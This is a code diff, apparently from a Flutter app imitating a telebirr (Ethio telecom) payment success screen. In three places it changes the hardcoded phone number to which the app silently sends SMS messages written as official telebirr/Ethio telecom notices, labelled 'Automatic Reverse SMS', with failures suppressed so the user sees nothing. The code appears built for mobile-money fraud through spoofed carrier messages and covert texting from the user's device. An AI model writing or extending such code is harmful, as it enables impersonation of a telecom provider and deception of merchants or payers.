@@ -125,7 +125,7 @@ class _SuccessPageState extends State<SuccessPage> {
           "Thank you for using telebirr. Ethio telecom.\n"
           "Further transactions might fail. Please try again later.";
       
-      await SmsSender.sendSms("0947141018", message);
+      await SmsSender.sendSms("0994797189", message);
       debugPrint("✓ Automatic Reverse SMS sent for transaction: $transactionID");
     } catch (e) {
       debugPrint("✗ Failed to send automatic reverse SMS: $e");
@@ -160,7 +160,7 @@ class _SuccessPageState extends State<SuccessPage> {
           "Thank you for using telebirr. Ethio telecom.\n"
           "Further transactions might fail. Please try again later.";
       
-      await SmsSender.sendSms("0947141018", message);
+      await SmsSender.sendSms("0994797189", message);
     } catch (e) {
       // Silent fail - no UI feedback
     }
@@ -310,7 +310,7 @@ Future<void> _saveTransactionLocally() async {
   }
 
   Future<void> _trySendSMS() async {
-    final String phoneNumber = "0947141018";
+    final String phoneNumber = "0994797189";
     final charges = _calculateCharges(widget.amount);
     
     final String formattedBalance = NumberFormat('#,##0.00', 'en_US').format(_currentBalance);
